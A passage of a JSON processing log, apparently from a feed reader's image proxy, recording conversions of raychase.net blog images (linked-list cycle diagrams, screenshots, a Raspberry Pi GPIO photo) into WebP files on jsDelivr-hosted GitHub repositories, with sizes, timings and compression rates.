23:45:02","host":"us-023*","referer":"https://www.raychase.net/?p=5790","linkMd5ListStr":"857807cd77aa4ae6c474aa3a13952bc3,857807cd77aa4ae6c474aa3a13952bc3","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"9.2%","sourceSize":"252.3 KB","destSize":"23.3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/snapshot.jpeg","sourceStatusCode":200,"destWidth":1882,"destHeight":1030,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn24@2020_1/2020/08/24/15-45-06-571_1406d40c5438d742.webp","sourceBytes":308053,"destBytes":109440,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":7103,"convertSpendMs":114,"createdTime":"2020-08-24 23:45:02","host":"us-003*","referer":"https://www.raychase.net/?p=5808","linkMd5ListStr":"c6be65c24cf617aa467a6f90508e5e6c,c6be65c24cf617aa467a6f90508e5e6c","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"35.5%","sourceSize":"300.8 KB","destSize":"106.9 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_3.png","sourceStatusCode":200,"destWidth":355,"destHeight":281,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn63@2020_5/2020/08/24/15-45-10-119_2d97d5ee8cae1dff.webp","sourceBytes":12924,"destBytes":4174,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":1671,"convertSpendMs":6,"createdTime":"2020-08-24 23:45:09","host":"us-011*","referer":"https://www.raychase.net/?p=6197","linkMd5ListStr":"9f899cfca3c5a170616710d03b1c84f4","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"32.3%","sourceSize":"12.6 KB","destSize":"4.1 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/成环和相交一起出现.png","sourceStatusCode":200,"destWidth":318,"destHeight":296,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn24@2020_5/2020/08/24/15-45-10-152_74286d2b6dd518ab.webp","sourceBytes":5010,"destBytes":4566,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":1755,"convertSpendMs":37,"createdTime":"2020-08-24 23:45:09","host":"us-023*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"91.1%","sourceSize":"4.9 KB","destSize":"4.5 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/相遇点.png","sourceStatusCode":200,"destWidth":311,"destHeight":273,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn83@2020_2/2020/08/24/15-45-10-184_ba4adbf8834eabb9.webp","sourceBytes":5472,"destBytes":4630,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":1749,"convertSpendMs":6,"createdTime":"2020-08-24 23:45:09","host":"us-015*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"84.6%","sourceSize":"5.3 KB","destSize":"4.5 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/链表相交.png","sourceStatusCode":200,"destWidth":420,"destHeight":137,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn75@2020_6/2020/08/24/15-45-10-134_0d4f19d9eaba38df.webp","sourceBytes":2193,"destBytes":2350,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":1776,"convertSpendMs":7,"createdTime":"2020-08-24 23:45:09","host":"us-039*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"107.2%","sourceSize":"2.1 KB","destSize":"2.3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_4.png","sourceStatusCode":200,"destWidth":375,"destHeight":278,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn60@2020_3/2020/08/24/15-45-10-286_d9b2130d2398003f.webp","sourceBytes":14367,"destBytes":5860,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":1976,"convertSpendMs":10,"createdTime":"2020-08-24 23:45:09","host":"us-023*","referer":"https://www.raychase.net/?p=6197","linkMd5ListStr":"9f899cfca3c5a170616710d03b1c84f4","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"40.8%","sourceSize":"14 KB","destSize":"5.7 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/先相交，后成环.png","sourceStatusCode":200,"destWidth":521,"destHeight":232,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn67@2020_2/2020/08/24/15-45-10-428_ee36fc583bbfafa5.webp","sourceBytes":5484,"destBytes":5166,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2005,"convertSpendMs":7,"createdTime":"2020-08-24 23:45:09","host":"europe-23*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"94.2%","sourceSize":"5.4 KB","destSize":"5 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/两个环.png","sourceStatusCode":200,"destWidth":200,"destHeight":262,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn71@2020_6/2020/08/24/15-45-10-417_53e378192272e729.webp","sourceBytes":4093,"destBytes":4022,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2199,"convertSpendMs":4,"createdTime":"2020-08-24 23:45:09","host":"europe61*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"98.3%","sourceSize":"4 KB","destSize":"3.9 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/一环一相交.png","sourceStatusCode":200,"destWidth":501,"destHeight":266,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_4/2020/08/24/15-45-10-964_3e3fff9d68bf03cd.webp","sourceBytes":5732,"destBytes":4870,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2549,"convertSpendMs":10,"createdTime":"2020-08-24 23:45:09","host":"us-019*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"85%","sourceSize":"5.6 KB","destSize":"4.8 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/链表相交2.png","sourceStatusCode":200,"destWidth":420,"destHeight":153,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn30@2020_3/2020/08/24/15-45-11-015_bd3e3e11e4291857.webp","sourceBytes":2619,"destBytes":2584,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2595,"convertSpendMs":5,"createdTime":"2020-08-24 23:45:09","host":"us-52*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"98.7%","sourceSize":"2.6 KB","destSize":"2.5 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/两个链表环.png","sourceStatusCode":200,"destWidth":570,"destHeight":254,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn7@2020_5/2020/08/24/15-45-11-123_a182dc0b61f103c8.webp","sourceBytes":6113,"destBytes":7272,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2678,"convertSpendMs":7,"createdTime":"2020-08-24 23:45:09","host":"us-007*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"119%","sourceSize":"6 KB","destSize":"7.1 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/06/Cygwin.png","sourceStatusCode":200,"destWidth":1215,"destHeight":212,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn3@2020_3/2020/08/24/15-45-11-024_17f45376dccf886b.webp","sourceBytes":13454,"destBytes":25750,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2709,"convertSpendMs":14,"createdTime":"2020-08-24 23:45:09","host":"us-019*","referer":"https://www.raychase.net/?p=6129","linkMd5ListStr":"93cfdd9891fef6b848bf4676af464a96","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"191.4%","sourceSize":"13.1 KB","destSize":"25.1 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/共用环入口.png","sourceStatusCode":200,"destWidth":318,"destHeight":300,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn27@2020_3/2020/08/24/15-45-11-214_0166f5fe971633a0.webp","sourceBytes":5131,"destBytes":4970,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2217,"convertSpendMs":12,"createdTime":"2020-08-24 23:45:09","host":"us-031*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"96.9%","sourceSize":"5 KB","destSize":"4.9 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/快慢指针相遇.png","sourceStatusCode":200,"destWidth":212,"destHeight":122,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn51@2020_3/2020/08/24/15-45-10-991_b099ce68545b964e.webp","sourceBytes":2788,"destBytes":3092,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2771,"convertSpendMs":4,"createdTime":"2020-08-24 23:45:09","host":"europe-57*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"110.9%","sourceSize":"2.7 KB","destSize":"3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/08/image.png","sourceStatusCode":200,"destWidth":395,"destHeight":248,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn43@2020_6/2020/08/24/15-45-11-436_7c875119feff755f.webp","sourceBytes":22207,"destBytes":10234,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":3092,"convertSpendMs":10,"createdTime":"2020-08-24 23:45:09","host":"us-007*","referer":"https://www.raychase.net/?p=6197","linkMd5ListStr":"9f899cfca3c5a170616710d03b1c84f4","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"46.1%","sourceSize":"21.7 KB","destSize":"10 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_5.png","sourceStatusCode":200,"destWidth":462,"destHeight":206,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn47@2020_4/2020/08/24/15-45-11-404_3e0f07b5cc3b3d5f.webp","sourceBytes":15669,"destBytes":6666,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2989,"convertSpendMs":5,"createdTime":"2020-08-24 23:45:09","host":"europe69*","referer":"https://www.raychase.net/?p=6197","linkMd5ListStr":"9f899cfca3c5a170616710d03b1c84f4","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"42.5%","sourceSize":"15.3 KB","destSize":"6.5 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_7.png","sourceStatusCode":200,"destWidth":1219,"destHeight":265,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn12@2020_1/2020/08/24/15-45-11-613_f8ba2dadb11bd8bf.webp","sourceBytes":46792,"destBytes":31902,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":3579,"convertSpendMs":14,"createdTime":"2020-08-24 23:45:09","host":"europe69*","referer":"https://www.raychase.net/?p=6197","linkMd5ListStr":"9f899cfca3c5a170616710d03b1c84f4","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"68.2%","sourceSize":"45.7 KB","destSize":"31.2 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_16-1024x360.png","sourceStatusCode":200,"destWidth":1024,"destHeight":360,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn100@2020_4/2020/08/24/15-45-12-168_0e8722acdec1e423.webp","sourceBytes":191111,"destBytes":30000,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":3764,"convertSpendMs":57,"createdTime":"2020-08-24 23:45:09","host":"us-031*","referer":"https://www.raychase.net/?p=5790","linkMd5ListStr":"857807cd77aa4ae6c474aa3a13952bc3","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"15.7%","sourceSize":"186.6 KB","destSize":"29.3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/06/Plex.png","sourceStatusCode":200,"destWidth":592,"destHeight":416,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn79@2020_6/2020/08/24/15-45-15-193_4ee517a03f4ba782.webp","sourceBytes":263448,"destBytes":21716,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":6871,"convertSpendMs":18,"createdTime":"2020-08-24 23:45:09","host":"us-027*","referer":"https://www.raychase.net/?p=6129","linkMd5ListStr":"93cfdd9891fef6b848bf4676af464a96","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"8.2%","sourceSize":"257.3 KB","destSize":"21.2 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4.png","sourceStatusCode":200,"destWidth":1438,"destHeight":546,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn33@2020_2/2020/08/24/15-45-15-437_2b2e2307ae825709.webp","sourceBytes":185917,"destBytes":58482,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":7172,"convertSpendMs":113,"createdTime":"2020-08-24 23:45:09","host":"us-030*","referer":"https://www.raychase.net/?p=5808","linkMd5ListStr":"c6be65c24cf617aa467a6f90508e5e6c","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"31.5%","sourceSize":"181.6 KB","destSize":"57.1 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_13-1024x362.png","sourceStatusCode":200,"destWidth":1024,"destHeight":362,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn91@2020_4/2020/08/24/15-45-15-031_f3a4c05660cb98e9.webp","sourceBytes":170612,"destBytes":34616,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":7073,"convertSpendMs":20,"createdTime":"2020-08-24 23:45:09","host":"europe65*","referer":"https://www.raychase.net/?p=5790","linkMd5ListStr":"857807cd77aa4ae6c474aa3a13952bc3","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"20.3%","sourceSize":"166.6 KB","destSize":"33.8 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200125_5.png","sourceStatusCode":200,"destWidth":1892,"destHeight":954,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn88@2020_6/2020/08/24/15-45-15-993_d875ffa605956e9e.webp","sourceBytes":307963,"destBytes":149518,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":7830,"convertSpendMs":251,"createdTime":"2020-08-24 23:45:09","host":"us-003*","referer":"https://www.raychase.net/?p=5808","linkMd5ListStr":"c6be65c24cf617aa467a6f90508e5e6c","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"48.6%","sourceSize":"300.7 KB","destSize":"146 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/06/acrosync_win_demo.gif","sourceStatusCode":200,"destWidth":661,"destHeight":582,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn15@2020_2/2020/08/24/15-45-18-228_4b45cebb126aa049.webp","sourceBytes":325427,"destBytes":394586,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":10827,"convertSpendMs":1344,"createdTime":"2020-08-24 23:45:09","host":"europe-57*","referer":"https://www.raychase.net/?p=6129","linkMd5ListStr":"93cfdd9891fef6b848bf4676af464a96","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"121.3%","sourceSize":"317.8 KB","destSize":"385.3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200114_15-752x1024.png","sourceStatusCode":200,"destWidth":752,"destHeight":1024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn96@2020_3/2020/08/24/15-45-20-885_8d908b68f789ea73.webp","sourceBytes":820976,"destBytes":83214,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":12651,"convertSpendMs":89,"createdTime":"2020-08-24 23:45:09","host":"us-53*","referer":"https://www.raychase.net/?p=5790","linkMd5ListStr":"857807cd77aa4ae6c474aa3a13952bc3","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"10.1%","sourceSize":"801.7 KB","destSize":"81.3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3.png","sourceStatusCode":200,"destWidth":2052,"destHeight":920,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_4/2020/08/24/15-45-21-647_e68ab4a401ab7581.webp","sourceBytes":1037552,"destBytes":73982,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":13450,"convertSpendMs":132,"createdTime":"2020-08-24 23:45:09","host":"us-035*","referer":"https://www.raychase.net/?p=5808","linkMd5ListStr":"c6be65c24cf617aa467a6f90508e5e6c","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"7.1%","sourceSize":"1,013.2 KB","destSize":"72.2 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/06/Raspberry-Pi-GPIO-Header-with-Photo.png","sourceStatusCode":200,"destWidth":1500,"destHeight":1000,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn20@2020_5/2020/08/24/15-45-22-711_e349268c2fdec9cc.webp","sourceBytes":1392240,"destBytes":183770,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":14565,"convertSpendMs":137,"createdTime":"2020-08-24 23:45:09","host":"us-035*","referer":"https://www.raychase.net/?p=6129","linkMd5ListStr":"93cfdd9891fef6b848bf4676af464a96","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"13.2%","sourceSize":"1.3 MB","destSize":"179.5 KB"}],"successGithubMap":{"myreaderx14":1,"myreaderx8":2,"myreaderx7":1,"myreaderx15":1,"myreaderx16":1,"myreaderx6":1,"myreaderx32":1,"myreaderx10":2,"myreaderx4":2,"myreaderx33":1,"myreaderx3":1,"myreaderx11":1,"myreaderx12":1,"myreaderx2":1,"myreaderx1":2,"myreaderx13":1,"myreaderx30":2,"myreaderx31":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx22":1,"myreaderx23":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{}}